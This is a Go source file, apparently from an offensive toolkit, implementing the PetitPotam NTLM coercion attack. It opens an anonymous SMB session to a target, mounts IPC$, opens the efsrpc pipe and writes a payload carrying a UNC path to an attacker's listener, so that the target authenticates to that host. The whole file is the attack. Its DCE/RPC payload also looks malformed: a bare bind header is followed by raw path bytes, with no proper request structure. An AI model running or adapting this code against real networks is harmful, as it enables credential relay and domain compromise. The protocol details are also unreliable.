// pkg/coercion/petitpotam.go
package coercion

import (
	"bytes"
	"encoding/binary"
	"fmt"
	"log"
	"net"

	"github.com/hirochachacha/go-smb2"
)

func TriggerPetitPotam(target, listener string) error {
	tcpConn, err := net.Dial("tcp", target+":445")
	if err != nil {
		return fmt.Errorf("TCP connection failed: %w", err)
	}
	defer tcpConn.Close()

	d := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     "",
			Password: "",
		},
	}
	session, err := d.Dial(tcpConn)
	if err != nil {
		return fmt.Errorf("Anonymous SMB dial failed : %w", err)
	}
	defer session.Logoff()

	fs, err := session.Mount("IPC$")
	if err != nil {
		return fmt.Errorf("IPC$ assembly failed : %w", err)
	}
	defer fs.Umount()

	pipe, err := fs.Open(`\pipe\efsrpc`)
	if err != nil {
		return fmt.Errorf("EFSRPC pipe opening failed : %w", err)
	}
	defer pipe.Close()

	// Construction du payload
	uncPath := fmt.Sprintf(`\\%s\pipe\whatever`, listener)
	uncBytes := utf16leEncode(uncPath + "\x00")

	var buf bytes.Buffer
	// DCE/RPC Bind header
	bindHeader := []byte{
		0x05, 0x00, // version majeure/mineure
		0x0b,                   // BIND
		0x03,                   // flags
		0x10, 0x00, 0x00, 0x00, // little-endian
		0x48, 0x00, // frag length
		0x00, 0x00, // auth length
		0x00, 0x00, 0x00, 0x00, // call ID
	}
	buf.Write(bindHeader)
	binary.Write(&buf, binary.LittleEndian, uint32(len(uncBytes)))
	buf.Write(uncBytes)

	payload := buf.Bytes()
	n, err := pipe.Write(payload)
	if err != nil {
		return fmt.Errorf("Payload sending failed : %w", err)
	}

	log.Printf("[+] PetitPotam : %d bytes sent (%s -> %s)", n, target, listener)
	return nil
}
